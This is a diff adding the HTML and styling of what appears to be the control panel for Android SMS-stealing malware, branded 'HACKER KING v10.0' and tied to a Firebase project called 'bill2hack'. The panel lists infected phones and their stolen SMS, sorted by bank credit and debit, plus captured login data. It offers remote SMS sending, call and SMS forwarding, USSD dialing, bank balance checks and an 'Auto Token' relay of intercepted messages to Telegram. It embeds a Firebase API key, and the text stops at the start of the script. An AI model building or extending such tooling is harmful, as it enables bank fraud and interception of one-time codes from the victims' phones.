+.firebase-status .dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse-dot 1.5s infinite}
+.firebase-status.error .dot{background:var(--red)}
+.expiry-timer-wrapper{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);z-index:9999;pointer-events:none}
+.expiry-timer-wrapper .countdown-timer{pointer-events:auto;padding:6px 16px;border-radius:8px;background:var(--card);border:1px solid var(--border);font-size:0.7rem;font-family:'JetBrains Mono',monospace;color:var(--amber);display:none;box-shadow:0 4px 12px rgba(0,0,0,0.4)}
+.expiry-timer-wrapper .countdown-timer.expired{color:var(--red);border-color:rgba(255,51,85,0.4);background:var(--red-soft)}
+.expiry-timer-wrapper .countdown-timer.show{display:inline-block}
+.spinner-small{width:12px;height:12px;border:2px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;vertical-align:middle}
+#allDataInner .data-entry{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:10px 12px;margin-bottom:8px;box-shadow:0 2px 8px rgba(0,0,0,0.2)}
+#allDataInner .data-entry:hover{border-color:var(--primary)}
+#allDataInner .data-entry .data-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;font-size:11px;font-weight:800;flex-wrap:wrap;gap:4px}
+#allDataInner .data-entry .data-head .serial-badge{background:var(--primary-soft);color:var(--primary);padding:2px 8px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:10px;border:1px solid rgba(255,45,111,0.35)}
+#allDataInner .data-entry .data-head .device-name{font-size:11px;color:var(--text);font-weight:700}
+#allDataInner .data-entry .data-fields{display:grid;grid-template-columns:1fr 1fr;gap:4px}
+#allDataInner .data-entry .data-field{font-size:10px;display:flex;gap:4px;align-items:center;padding:3px 6px;background:var(--bg-2);border-radius:5px;border:1px solid var(--border-soft)}
+#allDataInner .data-entry .data-field .k{color:var(--muted);font-weight:700;white-space:nowrap}
+#allDataInner .data-entry .data-field .v{color:var(--text);font-weight:700;word-break:break-all;flex:1;font-family:'JetBrains Mono',monospace}
+#allDataInner .data-entry .data-field .copy-btn{background:transparent;border:none;color:var(--label);cursor:pointer;font-size:10px;padding:0 2px}
+</style>
+</head>
+<body>
+
+<div class="firebase-status" id="firebaseStatus">
+  <span class="dot"></span>
+  <span id="firebaseStatusText">Connecting...</span>
+</div>
+
+<div id="blockOverlay">
+  <div class="card">
+    <span class="icon">🚫</span>
+    <h2>ACCESS BLOCKED</h2>
+    <p>Your admin panel access has been blocked.</p>
+    <div class="contact-msg">📞 Please contact admin for assistance</div>
+  </div>
+</div>
+
+<div id="expiryOverlay">
+  <div class="card">
+    <span class="icon">⛔</span>
+    <h2>LICENSE EXPIRED</h2>
+    <p>Your admin panel license has expired.</p>
+    <p>Expiry Date: <span class="expiry-date" id="expiryDateDisplay">N/A</span></p>
+    <div class="contact-msg">📞 Please contact admin for renewal</div>
+  </div>
+</div>
+
+<div id="passwordSetOverlay">
+  <div class="login-card">
+    <h2>Set Admin Password</h2>
+    <p>Create a password to secure your panel</p>
+    <input type="password" id="newAdminPassword" placeholder="Enter new password (min 4 chars)" />
+    <button id="setPasswordBtn"><i class="bi bi-check-circle me-2"></i>Set Password</button>
+    <div class="login-msg" id="passMsg"></div>
+  </div>
+</div>
+
+<div id="loginOverlay">
+  <div class="login-card">
+    <h2>Admin Login</h2>
+    <p>Enter your password to access the panel</p>
+    <input type="password" id="loginPassword" placeholder="Enter password" />
+    <button id="loginBtn"><i class="bi bi-box-arrow-in-right me-2"></i>Login</button>
+    <div class="login-msg" id="loginMsg"></div>
+  </div>
+</div>
+
+<div class="expiry-timer-wrapper" id="expiryTimerWrapper">
+  <div class="countdown-timer" id="expiryTimerElement">⏳ Expires in: --</div>
+</div>
+
+<div class="app-bar">
+  <div class="app-bar-row">
+    <div class="app-title">
+      HACKER KING
+      <small>v10.0</small>
+    </div>
+    <div class="status-chips" id="statusChips">
+      <span class="chip green" id="chipConnection"><span class="dot pulse"></span>Live</span>
+      <span class="chip amber" id="chipDevices"><i class="bi bi-phone"></i>0/0</span>
+      <span class="chip blue" id="chipBot"><i class="bi bi-telegram"></i>Off</span>
+      <span class="bot-status-badge stopped" id="botGlobalStatus">⏹ BOT OFF</span>
+    </div>
+  </div>
+  <div class="tabs" id="tabsRow">
+    <button class="tab active" data-page="devices"><i class="bi bi-phone me-1"></i>Devices</button>
+    <button class="tab" data-page="messages"><i class="bi bi-chat me-1"></i>All SMS</button>
+    <button class="tab" data-page="alldata"><i class="bi bi-database me-1"></i>All Data</button>
+    <button class="tab" data-page="backup"><i class="bi bi-cloud me-1"></i>Backup</button>
+    <button class="tab" data-page="settings"><i class="bi bi-gear me-1"></i>Settings</button>
+  </div>
+</div>
+
+<div class="marquee-bar">
+  <div class="marquee-track">
+    <span>Bank Detection + Auto Token + Live 0.1s Polling Active</span>
+    <span>Bank Detection + Auto Token + Live 0.1s Polling Active</span>
+    <span>Bank Detection + Auto Token + Live 0.1s Polling Active</span>
+  </div>
+</div>
+
+<div class="container-app">
+  <div class="page active" id="page-devices">
+    <div id="deviceListView">
+      <div class="page-head"><h2><i class="bi bi-phone"></i> Devices</h2></div>
+      <div class="stats-grid">
+        <div class="stat-box"><div class="num" id="statTotal">0</div><div class="lbl">Total</div></div>
+        <div class="stat-box"><div class="num green" id="statOnline">0</div><div class="lbl">🟢 Online</div></div>
+        <div class="stat-box"><div class="num red" id="statOffline">0</div><div class="lbl">🔴 Offline</div></div>
+      </div>
+      <div class="search-wrap">
+        <i class="bi bi-search"></i>
+        <input type="text" class="search-input" id="deviceSearch" placeholder="Search device..." />
+      </div>
+      <div class="filter-row">
+        <button class="filter-chip active" data-dfilter="all">All</button>
+        <button class="filter-chip" data-dfilter="online">🟢 Online</button>
+        <button class="filter-chip" data-dfilter="offline">🔴 Offline</button>
+        <button class="filter-chip all-sms-chip" onclick="showDeviceAllSms()"><i class="bi bi-chat"></i> All SMS</button>
+      </div>
+      <div id="deviceList"><div id="deviceListInner"></div></div>
+    </div>
+
+    <div id="homeDeviceView" style="display:none;">
+      <div id="homeDeviceScroll">
+        <div class="device-card">
+          <div class="device-head">
+            <div class="device-head-left">
+              <div class="device-avatar">
+                <i class="bi bi-phone"></i>
+                <span class="live-dot" id="hdLiveDot"></span>
+              </div>
+              <div>
+                <div class="device-name" id="hdName">Unknown Device</div>
+                <div class="device-sub" id="hdSub">—</div>
+              </div>
+            </div>
+            <div style="display:flex; gap:5px;">
+              <button class="icon-btn danger" onclick="deleteSelectedUser()" title="Delete device"><i class="bi bi-trash"></i></button>
+              <button class="icon-btn" onclick="goHome()" title="Back"><i class="bi bi-arrow-left"></i></button>
+            </div>
+          </div>
+          <div class="info-grid">
+            <div class="info-cell"><div class="lbl"><i class="bi bi-phone"></i>Name</div><div class="val" id="hdDeviceName">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-fingerprint"></i>Device ID</div><div class="val mono" id="hdDeviceId">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-battery-half"></i>Battery</div><div class="val" id="hdBattery">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-person"></i>User ID</div><div class="val mono" id="hdUserId">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-sim"></i>SIM 1</div><div class="val" id="hdSim1">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-sim"></i>SIM 2</div><div class="val" id="hdSim2">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-calendar"></i>Installed</div><div class="val" id="hdInstalled">—</div></div>
+            <div class="info-cell"><div class="lbl"><i class="bi bi-clock"></i>Last Seen</div><div class="val" id="hdLastSeen">—</div></div>
+          </div>
+          <div id="hdBankCardContainer"></div>
+          <div class="online-check-result" id="onlineCheckResult">
+            <i class="bi bi-wifi"></i>
+            <span id="onlineCheckText">Checking...</span>
+          </div>
+          <div class="status-box" id="cfStatusBox">
+            <i class="bi bi-telephone-forward" id="cfStatusIcon"></i>
+            <span id="cfStatusText">—</span>
+          </div>
+          <div class="status-box" id="ussdResultBox">
+            <i class="bi bi-telephone-inbound" id="ussdResultIcon"></i>
+            <span id="ussdResultText">—</span>
+          </div>
+        </div>
+
+        <div class="action-box">
+          <div class="action-box-title"><i class="bi bi-lightning-charge-fill" style="color:var(--primary);"></i> Actions</div>
+          <div class="actions-grid">
+            <button class="action-btn" onclick="scrollToDeviceSms()"><i class="bi bi-chat"></i><span class="t">All SMS</span></button>
+            <button class="action-btn" onclick="onlineCheck()"><i class="bi bi-wifi"></i><span class="t">Check Online</span></button>
+            <button class="action-btn" onclick="openSendSms()"><i class="bi bi-send"></i><span class="t">Send SMS</span></button>
+            <button class="action-btn" onclick="refreshData()"><i class="bi bi-arrow-clockwise"></i><span class="t">Update</span></button>
+            <button class="action-btn" onclick="openCallForward()"><i class="bi bi-telephone-outbound"></i><span class="t">Call Forward</span></button>
+            <button class="action-btn" onclick="openSmsForward()"><i class="bi bi-chat-square-text"></i><span class="t">SMS Forward</span></button>
+            <button class="action-btn danger-soft" onclick="scrollToLoginDetails()"><i class="bi bi-database"></i><span class="t">Data</span></button>
+            <button class="action-btn primary-soft" onclick="fetchMessages()"><i class="bi bi-cloud-arrow-down"></i><span class="t">Fetch Messages</span></button>
+            <button class="action-btn" onclick="openUssdModal()"><i class="bi bi-telephone"></i><span class="t">Dial USSD</span></button>
+            <button class="action-btn auto-token-btn" onclick="openAutoTokenModal()"><i class="bi bi-robot"></i><span class="t">Auto Token</span></button>
+            <button class="action-btn" onclick="refreshBankBalance()"><i class="bi bi-bank"></i><span class="t">Refresh Bank</span></button>
+            <button class="action-btn" onclick="manualRefreshDeviceSms()"><i class="bi bi-arrow-repeat"></i><span class="t">Live SMS</span></button>
+            <button class="action-btn sms-store-btn" id="smsStoreBtn" onclick="toggleSmsStore()"><i class="bi bi-cloud-arrow-up" id="smsStoreIcon"></i><span class="t" id="smsStoreLabel">SMS Store: OFF</span></button>
+          </div>
+        </div>
+
+        <div id="deviceDataSection" style="margin-bottom: 14px;">
+          <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:8px;">
+            <h3 style="font-size:13px; font-weight:900; display:flex; align-items:center; gap:6px; margin:0; color:var(--text);">
+              <i class="bi bi-database" style="color:var(--pink);"></i>
+              Login Data
+              <span style="background:var(--pink-soft); color:var(--pink); font-size:10px; font-weight:800; padding:1px 7px; border-radius:999px; border:1px solid rgba(255,107,181,0.35);" id="deviceDataCount">0</span>
+            </h3>
+            <button class="mini-btn" id="toggleDataBtn" onclick="toggleLoginData()" style="font-size:9.5px;padding:2px 8px;display:none;">
+              <i class="bi bi-chevron-contract"></i> <span>Show Less</span>
+            </button>
+          </div>
+          <div id="deviceDataList">
+            <div class="empty"><i class="bi bi-database"></i><p>No login data</p></div>
+          </div>
+        </div>
+
+        <div id="deviceSmsSection" style="margin-bottom: 30px;">
+          <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:8px;">
+            <h3 style="font-size:13px; font-weight:900; display:flex; align-items:center; gap:6px; margin:0; color:var(--text);">
+              <i class="bi bi-chat" style="color:var(--primary);"></i>
+              SMS Messages
+              <span style="background:var(--primary-soft); color:var(--primary); font-size:10px; font-weight:800; padding:1px 7px; border-radius:999px; border:1px solid rgba(255,45,111,0.35);" id="deviceSmsCount">0</span>
+            </h3>
+            <button class="mini-btn primary" onclick="fetchMessages()"><i class="bi bi-cloud-arrow-down"></i> Fetch</button>
+          </div>
+          <div class="msg-toolbar">
+            <div class="live-badge turbo" id="liveBadge"><span class="ld"></span><span id="liveBadgeText">LIVE · 0.1s</span></div>
+            <div class="msg-count-chip">TOTAL <b id="msgCount">0</b></div>
+            <button class="refresh-btn" id="refreshMsgsBtn" onclick="manualRefreshDeviceSms()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+          </div>
+          <div class="search-wrap">
+            <i class="bi bi-search"></i>
+            <input type="text" class="search-input" id="deviceSmsSearch" placeholder="Search in this device..." />
+          </div>
+          <div class="filter-row">
+            <button class="filter-chip active" data-dsfilter="all">📨 All</button>
+            <button class="filter-chip credit" data-dsfilter="credit">💰 Credit</button>
+            <button class="filter-chip debit" data-dsfilter="debit">💸 Debit</button>
+            <button class="filter-chip" data-dsfilter="bank_debit">🏦 Bank Debit</button>
+          </div>
+          <div id="deviceSmsInner"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-messages">
+    <div class="page-head">
+      <h2><i class="bi bi-chat"></i> All SMS</h2>
+      <div class="page-head-actions">
+        <span class="search-results-count" id="smsSearchCount">0 results</span>
+        <button class="mini-btn primary" id="allSmsRefreshBtn" onclick="refreshAllSms()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+        <button class="mini-btn danger" onclick="deleteAllSms()"><i class="bi bi-trash"></i> Delete All</button>
+      </div>
+    </div>
+    <div class="search-wrap">
+      <i class="bi bi-search"></i>
+      <input type="text" class="search-input" id="smsSearch" placeholder="Search by sender, message, device, serial..." />
+      <button class="clear-search" id="clearSmsSearch" onclick="clearAllSmsSearch()"><i class="bi bi-x-circle"></i></button>
+    </div>
+    <div class="filter-row">
+      <button class="filter-chip active" data-filter="all">📨 All (<span id="allSmsTotal">0</span>)</button>
+      <button class="filter-chip credit" data-filter="credit">💰 Credit (<span id="creditSmsTotal">0</span>)</button>
+      <button class="filter-chip debit" data-filter="debit">💸 Debit (<span id="debitSmsTotal">0</span>)</button>
+      <button class="filter-chip" data-filter="bank_debit">🏦 Bank Debit (<span id="bankDebitSmsTotal">0</span>)</button>
+      <button class="filter-chip gold" data-filter="highest">🏆 Highest (<span id="highestSmsTotal">0</span>)</button>
+    </div>
+    <div id="smsList">
+      <div id="smsInner"></div>
+      <div class="load-more" id="smsLoadMore" style="display:none;"><div class="spinner-small"></div> Loading more...</div>
+    </div>
+  </div>
+
+  <div class="page" id="page-alldata">
+    <div class="page-head">
+      <h2><i class="bi bi-database"></i> All Data</h2>
+      <div class="page-head-actions">
+        <span class="search-results-count" id="allDataCount">0 entries</span>
+        <button class="mini-btn primary" onclick="refreshAllData()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+      </div>
+    </div>
+    <div class="search-wrap">
+      <i class="bi bi-search"></i>
+      <input type="text" class="search-input" id="allDataSearch" placeholder="Search by serial, device name, or value..." />
+    </div>
+    <div id="allDataInner"></div>
+  </div>
+
+  <div class="page" id="page-backup">
+    <div class="page-head">
+      <h2><i class="bi bi-cloud"></i> Backup SMS</h2>
+      <div class="page-head-actions">
+        <span class="search-results-count" id="backupSearchCount">0 entries</span>
+        <button class="mini-btn primary" id="backupRefreshBtn" onclick="refreshBackupList()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+        <button class="mini-btn danger" onclick="deleteAllBackupSms()"><i class="bi bi-trash"></i> Delete All</button>
+      </div>
+    </div>
+    <div class="search-wrap">
+      <i class="bi bi-search"></i>
+      <input type="text" class="search-input" id="backupSearch" placeholder="Search backup by sender, device, serial, message..." />
+      <button class="clear-search" id="clearBackupSearch" onclick="clearAllBackupSearch()"><i class="bi bi-x-circle"></i></button>
+    </div>
+    <div class="filter-row">
+      <button class="filter-chip active" data-bfilter="all">📨 All (<span id="backupAllTotal">0</span>)</button>
+      <button class="filter-chip credit" data-bfilter="credit">💰 Credit (<span id="backupCreditTotal">0</span>)</button>
+      <button class="filter-chip debit" data-bfilter="debit">💸 Debit (<span id="backupDebitTotal">0</span>)</button>
+      <button class="filter-chip" data-bfilter="bank_debit">🏦 Bank Debit (<span id="backupBankDebitTotal">0</span>)</button>
+    </div>
+    <div id="backupList"><div id="backupInner"></div></div>
+  </div>
+
+  <div class="page" id="page-settings">
+    <div class="page-head"><h2><i class="bi bi-gear"></i> Settings</h2></div>
+    <div>
+      <div class="device-card">
+        <div class="info-cell" style="margin-bottom:6px;">
+          <div class="lbl"><i class="bi bi-telegram"></i>Telegram Bot</div>
+          <div class="val" id="stBotStatus">Not configured</div>
+        </div>
+        <div style="display:flex; gap:5px; flex-wrap:wrap;">
+          <button class="mini-btn primary" onclick="openTelegramBot()"><i class="bi bi-pencil"></i> Configure</button>
+          <button class="mini-btn" onclick="startBotForDevice()"><i class="bi bi-play-fill"></i> Start</button>
+          <button class="mini-btn danger" onclick="stopBotForDevice()"><i class="bi bi-stop-fill"></i> Stop</button>
+        </div>
+      </div>
+      <div class="device-card">
+        <div class="info-cell" style="margin-bottom:6px;">
+          <div class="lbl"><i class="bi bi-telephone-forward"></i>Forward Number</div>
+          <div class="val" id="stForwardNumber">Not set</div>
+        </div>
+        <button class="mini-btn primary" onclick="openUpdateNumber()"><i class="bi bi-pencil"></i> Update</button>
+      </div>
+      <div class="device-card">
+        <div class="info-cell" style="margin-bottom:6px;">
+          <div class="lbl"><i class="bi bi-key"></i>Admin Login Password</div>
+          <div class="val">••••••••</div>
+        </div>
+        <button class="mini-btn primary" onclick="openChangePassword()"><i class="bi bi-pencil"></i> Change Login Password</button>
+      </div>
+      <div class="device-card">
+        <div class="info-cell" style="margin-bottom:6px;">
+          <div class="lbl"><i class="bi bi-shield-lock"></i>Delete Password</div>
+          <div class="val">All SMS + Device delete</div>
+        </div>
+        <button class="mini-btn danger" onclick="openSetDeletePassword()"><i class="bi bi-shield-lock"></i> Set / Change</button>
+      </div>
+      <div class="device-card">
+        <div class="info-cell" style="margin-bottom:6px;">
+          <div class="lbl"><i class="bi bi-box-arrow-right"></i>Session</div>
+          <div class="val" id="sessionStatus">Not logged in</div>
+        </div>
+        <button class="mini-btn danger" onclick="logoutSession()"><i class="bi bi-box-arrow-right"></i> Logout Now</button>
+      </div>
+      <div class="device-card">
+        <div class="info-cell" style="margin-bottom:6px;">
+          <div class="lbl"><i class="bi bi-palette"></i>Theme Accent</div>
+          <div class="val">Tap a color below</div>
+        </div>
+        <div id="accentGrid" style="display:flex; gap:6px; flex-wrap:wrap; margin-top:8px;"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="bottom-nav">
+  <button class="nav-item active" data-page="devices"><i class="bi bi-phone"></i><span>Devices</span></button>
+  <button class="nav-item" data-page="messages"><i class="bi bi-chat"></i><span>All SMS</span></button>
+  <button class="nav-item" data-page="alldata"><i class="bi bi-database"></i><span>All Data</span></button>
+  <button class="nav-item" data-page="backup"><i class="bi bi-cloud"></i><span>Backup</span></button>
+  <button class="nav-item" data-page="settings"><i class="bi bi-gear"></i><span>Settings</span></button>
+</div>
+
+<!-- MODALS -->
+<div class="modal fade" id="ussdModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">📞 Dial USSD</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Select Device</label>
+    <select class="form-control mb-2" id="ussdDeviceSelect"><option value="">-- Select Device --</option></select>
+    <label class="form-label">USSD Code</label>
+    <input class="form-control mb-2" id="ussdCode" placeholder="*123#" />
+    <label class="form-label">SIM Slot</label>
+    <select class="form-control mb-2" id="ussdSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
+    <div class="status-box" id="ussdResponseBox">
+      <i class="bi bi-telephone-inbound" id="ussdResponseIcon"></i>
+      <div style="flex:1;">
+        <div style="font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:0.6px;opacity:0.7;">USSD Response</div>
+        <div id="ussdResponseText">Waiting...</div>
+        <div id="ussdResponseCode" style="font-family:'JetBrains Mono',monospace;font-size:10px;opacity:0.7;margin-top:3px;"></div>
+      </div>
+    </div>
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn-primary-soft" onclick="sendUssdCommand()"><i class="bi bi-send"></i> Run</button></div>
+</div></div></div>
+
+<div class="modal fade" id="sendSmsModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">Send SMS</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Phone Number</label>
+    <input class="form-control mb-2" id="smsPhone" placeholder="+91..." />
+    <label class="form-label">Message <span id="charCount">0/180</span></label>
+    <textarea class="form-control mb-2" id="smsMessage" rows="3" oninput="updateCharCount()"></textarea>
+    <label class="form-label">SIM Slot</label>
+    <select class="form-control" id="smsSim"><option value="0">SIM 1</option><option value="1">SIM 2</option></select>
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn-primary-soft" onclick="sendSmsCommand()"><i class="bi bi-send"></i> Send</button></div>
+</div></div></div>
+
+<div class="modal fade" id="callForwardModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">Call Forward</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Phone Number</label>
+    <input class="form-control mb-2" id="cfPhone" placeholder="+91..." />
+    <label class="form-label">SIM Slot</label>
+    <select class="form-control mb-2" id="cfSim"><option value="0">SIM 1</option><option value="1">SIM 2</option></select>
+    <div class="status-box" id="cfStatusBox">
+      <i class="bi bi-telephone-forward" id="cfStatusIcon"></i>
+      <span id="cfStatusText">—</span>
+    </div>
+    <div style="display:flex; gap:5px; flex-wrap:wrap;">
+      <button type="button" class="btn-primary-soft" onclick="callForwardActivate()" style="flex:1;"><i class="bi bi-play"></i> Activate</button>
+      <button type="button" class="btn-danger-soft" onclick="callForwardDeactivate()" style="flex:1;"><i class="bi bi-stop"></i> Deactivate</button>
+    </div>
+    <button type="button" class="btn-secondary" onclick="callForwardStatus()" style="width:100%; margin-top:6px;"><i class="bi bi-info-circle"></i> Check Status</button>
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Close</button></div>
+</div></div></div>
+
+<div class="modal fade" id="smsForwardModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">SMS Forward</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Forward Number</label>
+    <input class="form-control" id="sfNumber" placeholder="+91..." />
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn-primary-soft" onclick="saveSmsForward()"><i class="bi bi-check"></i> Save</button></div>
+</div></div></div>
+
+<div class="modal fade" id="telegramBotModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">Telegram Bot</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Chat ID</label>
+    <input class="form-control mb-2" id="botChatId" placeholder="123456789" />
+    <label class="form-label">Bot Token</label>
+    <input class="form-control" id="botToken" placeholder="1234:ABC..." />
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn-primary-soft" onclick="saveTelegramBot()"><i class="bi bi-check"></i> Save</button></div>
+</div></div></div>
+
+<div class="modal fade" id="updateNumberModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">Update Forward Number</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Forward Number</label>
+    <input class="form-control" id="fwdNumber" placeholder="+91..." />
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn-primary-soft" onclick="updateForwardNumber()"><i class="bi bi-check"></i> Update</button></div>
+</div></div></div>
+
+<div class="modal fade" id="autoTokenModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">🤖 AUTO TOKEN</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">SMS Channel Link / ID</label>
+    <input class="form-control mb-2" id="asChannel" placeholder="https://t.me/yourchannel" />
+    <label class="form-label">Bot Token</label>
+    <input class="form-control mb-3" id="asBotToken" placeholder="123456:ABC-DEF..." autocomplete="off" />
+    <div class="active-box">
+      <div class="active-box-title">Auto SMS Engine</div>
+      <div class="active-box-num" id="asChannelDisplay">Not configured</div>
+      <div class="active-box-sub">Bot से आने वाला हर SMS turant send होगा</div>
+      <button class="active-btn" id="asActiveBtn" onclick="toggleAutoToken()">ACTIVATE</button>
+    </div>
+    <div id="asLiveStatus" style="display:none;margin-top:14px;text-align:center;">
+      <div class="pulse-live"><span class="d"></span>ENGINE RUNNING · 0.1s</div>
+    </div>
+    <div class="auto-log" id="asLog"></div>
+    <div class="modal-err" id="asErr" style="display:none;margin-top:10px;padding:8px 12px;background:var(--red-soft);border:1px solid rgba(255,51,85,0.4);border-radius:8px;color:var(--red);font-size:11px;font-weight:700;"></div>
+  </div>
+  <div class="modal-footer">
+    <button type="button" class="btn-secondary" data-bs-dismiss="modal">Close</button>
+    <button type="button" class="btn-danger-soft" onclick="resetAutoToken()">Reset</button>
+  </div>
+</div></div></div>
+
+<div class="modal fade" id="changePassModal" tabindex="-1" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Change Login Password</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body">
+        <label class="form-label">Current Password <span style="color:var(--red);">*</span></label>
+        <input type="password" class="form-control mb-2" id="oldPass" placeholder="Enter current password" />
+        <label class="form-label">New Password <span style="color:var(--red);">*</span></label>
+        <input type="password" class="form-control mb-2" id="newPass" placeholder="Min 4 characters" />
+        <label class="form-label">Confirm New Password <span style="color:var(--red);">*</span></label>
+        <input type="password" class="form-control mb-2" id="newPass2" placeholder="Repeat new password" />
+        <div id="changePassStatus" style="font-size:11px;padding:8px 10px;border-radius:8px;display:none;margin-top:6px;font-weight:700;"></div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button>
+        <button type="button" class="btn-primary-soft" id="changePassBtn" onclick="changePassword()"><i class="bi bi-check"></i> Change Password</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal fade" id="deletePassModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+  <div class="modal-header"><h5 class="modal-title">Delete Password</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+  <div class="modal-body">
+    <label class="form-label">Delete Password</label>
+    <input type="password" class="form-control mb-2" id="delPass1" placeholder="Min 4 characters" />
+    <label class="form-label">Confirm</label>
+    <input type="password" class="form-control" id="delPass2" placeholder="Repeat password" />
+  </div>
+  <div class="modal-footer"><button type="button" class="btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn-primary-soft" onclick="saveDeletePassword()"><i class="bi bi-check"></i> Save</button></div>
+</div></div></div>
+
+<div class="modal fade" id="verifyDeletePassModal" tabindex="-1" data-bs-backdrop="static" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">🔒 Enter Delete Password</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" onclick="cancelDeleteVerify()"></button>
+      </div>
+      <div class="modal-body">
+        <label class="form-label">Password</label>
+        <input type="password" class="form-control mb-2" id="verifyDeletePassInput" placeholder="Enter delete password..." onkeydown="if(event.key==='Enter')confirmDeleteWithPassword()" />
+        <div id="verifyDeletePassStatus" style="font-size:11px;padding:6px 10px;border-radius:6px;display:none;font-weight:700;"></div>
+        <div id="verifyDeleteTarget" style="font-size:10px;color:var(--muted);margin-top:6px;"></div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn-secondary" data-bs-dismiss="modal" onclick="cancelDeleteVerify()">Cancel</button>
+        <button type="button" class="btn-danger-soft" id="confirmDeleteBtn" onclick="confirmDeleteWithPassword()"><i class="bi bi-trash"></i> Confirm Delete</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast-daimon" id="toast"></div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script type="importmap">
+{
+  "imports": {
+    "firebase/app": "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js",
+    "firebase/database": "https://www.gstatic.com/firebasejs/12.15.0/firebase-database.js",
+    "firebase/auth": "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js"
+  }
+}
+</script>
+<script type="module">
+import { initializeApp } from "firebase/app";
+import { getDatabase, ref, onValue, set, remove, update, onChildChanged, onChildAdded, get } from "firebase/database";
+import { getAuth, signInAnonymously, onAuthStateChanged } from "firebase/auth";
+
+const firebaseConfig = {
+ apiKey: "AIzaSyAv2gZM--hiX1oVbGKDuALk0M0sgwTPWH0",
+    authDomain: "bill2hack.firebaseapp.com",
+    databaseURL: "https://bill2hack-default-rtdb.firebaseio.com",
+    projectId: "bill2hack",
+    storageBucket: "bill2hack.firebasestorage.app",
+    messagingSenderId: "376594214938",
+    appId: "1:376594214938:web:74c75affbe33986cffe1a3"
+};
+
+let db = null, auth = null, authReady = false, authCallbacks = [];
+function onAuthReady(cb) { if (authReady) cb(); else authCallbacks.push(cb); }
+
+try {
